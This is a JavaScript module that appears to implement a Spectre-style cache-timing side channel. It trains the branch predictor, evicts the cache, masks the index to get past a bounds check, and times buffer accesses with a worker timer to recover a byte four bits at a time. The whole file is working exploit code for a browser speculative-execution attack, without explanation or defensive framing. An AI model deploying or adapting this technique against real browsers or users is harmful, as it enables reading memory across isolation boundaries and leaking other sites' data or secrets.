import { RegressionTimer } from "./timer.regression.js";
import { WorkerTimer } from "./timer.worker.js";
import { delay, rnd } from "./utils.js";

const Timer = WorkerTimer;

const PAGE_SIZE = 4 * 1024;
const PADDING = 2 * PAGE_SIZE;
const BUFFER_OFFSET = PADDING;
const TRAINING_ITERATIONS = 10;
const MEASURE_ITERATIONS = 10;

function minIndex(arr) {
  var mini = -1, minv = 0;
  for (var i = 0; i < arr.length; i++) {
    var v = arr[i];
    if (mini < 0 || v < minv) {
      mini = i;
      minv = v;
    }
  }
  return mini;
}

export function until_agreement(fn, timeout_iterations=100) {
  var h1 = -1, h2 = -1, h3 = -1;
  for (var iter = 0; iter < timeout_iterations; iter++) {
    const current = fn();
    if (h1 === current && h2 === current && h3 === current) {
      return current;
    }
    h3 = h2; h2 = h1; h1 = current;
  }
  throw new Error("until_agreement timeout");
}


const _timer = new Timer();
let _junk = 0;
const _times = new Float64Array(16);

// must be power of two so the index masking logic doesn't break in measure
const _buffer = new Uint8Array(2 * 16 * PAGE_SIZE);
const _buffer_length = _buffer.length;

const _evict = new Int32Array(16 * 1024 * 1024);
const _probe = new Uint8Array([1,3,3,7,11,13,13,17,55,88,111,155,166,188,211,255]);

for (var i = 0; i < _buffer.length; i++) {
  _buffer[i] = rnd(i, 1);
}
for (var i = 0; i < _evict.length; i++) {
  _evict[i] = rnd(i, 2);
}

function measure(index) {
  INDEX = index|0;
  BITS = 0;
  const b0 = until_agreement(measure_without_agreement);
  BITS = 4;
  const b4 = until_agreement(measure_without_agreement);
  return (b0 << 0) | (b4 << 4);
}
var INDEX = 0;
var BITS = 0;
  
function measure_without_agreement() {
  try {
    measure_times_single_4bit();
  } finally {
    _timer.stop();
  }
  // console.log(this._times);
  const result = minIndex(_times);
  // console.log(result);
  return result;
}
  
function measure_times_single_4bit() {
  const index = INDEX |0;
  const bits = BITS |0;
  var acc = 0;

  for (var runId = -TRAINING_ITERATIONS; runId < MEASURE_ITERATIONS; runId++)
  {
    var temp_idx = index|0;
    
    // train predictor
    if (runId <= 0) {
      temp_idx = temp_idx & 0x3;
    }
    
    // inlined evict
    for (var i = 0; i < _evict.length; i += 5) {
      acc ^= _evict[i];
    }
    
    /*
    acc ^= _probe[0];
    acc ^= _probe[1];
    acc ^= _probe[2];
    acc ^= _buffer.length;
    */
    
    if (temp_idx|0 < _probe.length) {
      temp_idx = _probe[temp_idx]|0;
      temp_idx = (temp_idx >> bits)|0;
      temp_idx = (temp_idx & 0x03)|0;
      temp_idx = (temp_idx * PAGE_SIZE)|0;
      temp_idx = (temp_idx + BUFFER_OFFSET)|0;
      // to bypass bound checking branch
      const MASK = (_buffer_length-1)|0;
      temp_idx = (temp_idx & MASK) |0;
      acc ^= _buffer[temp_idx]|0;
    }
    
    
    _timer.start();
    for (var i = 0; i < 16; i++) {
      var temp_idx = i |0;
      temp_idx = temp_idx * PAGE_SIZE + BUFFER_OFFSET;
      temp_idx = temp_idx|0;
      _timer.reset();
      if (temp_idx < _buffer.length) {
        let t0 = _timer.sample();
        var temp = _buffer[temp_idx];
        let t1 = _timer.sample();
        acc ^= temp;
        const elapsed = t1 - t0;
        _times[i] += elapsed;
      }
    }
    _timer.stop();
    
    if (runId == 0) {
      _times.fill(0);
    }
  }

  _junk ^= acc;
}  

export const CacheTimingChannel = { measure };